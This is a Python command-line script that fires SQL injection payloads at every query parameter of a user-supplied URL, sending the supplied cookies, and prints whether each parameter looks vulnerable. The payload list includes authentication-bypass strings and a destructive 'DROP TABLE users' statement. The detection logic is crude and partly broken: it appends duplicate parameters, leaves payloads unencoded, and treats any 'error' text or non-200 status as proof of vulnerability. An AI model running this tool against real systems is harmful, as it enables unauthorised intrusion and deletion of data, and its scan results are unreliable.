import requests
import sys
import json

# List of basic SQL Injection payloads
SQL_PAYLOADS = ["' OR 1=1 --", "' OR 'a'='a", "' OR 'x'='x", "'; DROP TABLE users--"]

# Function to check for SQL Injection vulnerability
def check_sql_injection(url, param_name, payload, cookies):
    vuln_url = f"{url}&{param_name}={payload}"
    response = requests.get(vuln_url, cookies=cookies)
    
    # Basic check for SQL injection vulnerability
    if "error" in response.text.lower() or response.status_code != 200:
        print(f"SQL Injection vulnerability found at {vuln_url}")
    else:
        print(f"No SQL Injection vulnerability at {vuln_url}")

# Function to scan all URL parameters with various payloads
def scan_url_parameters(url, query_params, cookies):
    for param_name in query_params:
        print(f"\nScanning {param_name} at {url}")

        # Checking SQL Injection for each parameter with all payloads
        for payload in SQL_PAYLOADS:
            check_sql_injection(url, param_name, payload, cookies)

# Main function to scan the provided URL for SQL injection vulnerabilities
def scan_target(url, cookies):
    print(f"\nScanning {url} for SQL injection vulnerabilities...\n")

    # Directly scan the URL for vulnerabilities
    query_params = url.split('?')[1] if '?' in url else ''  # Extract parameters after '?' in the URL

    if query_params:
        query_params = query_params.split('&')  # Split parameters by '&'
        for param in query_params:
            param_name = param.split('=')[0]  # Extract the parameter name
            scan_url_parameters(url, [param_name], cookies)
    else:
        print(f"No URL parameters found in {url}.")

    print("\nScanning complete.")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 sql.py <URL> <cookies>")
        sys.exit(1)
    
    target_url = sys.argv[1]
    cookies_str = sys.argv[2]
    
    # Convert cookies from string to a dictionary
    try:
        cookies = json.loads(cookies_str)
    except json.JSONDecodeError as e:
        print(f"Invalid cookies format: {e}")
        sys.exit(1)
    
    # Normalize the URL to ensure it starts with 'http://'
    if not target_url.startswith("http"):
        target_url = "http://" + target_url
    
    # Scan the target for vulnerabilities
    scan_target(target_url, cookies)
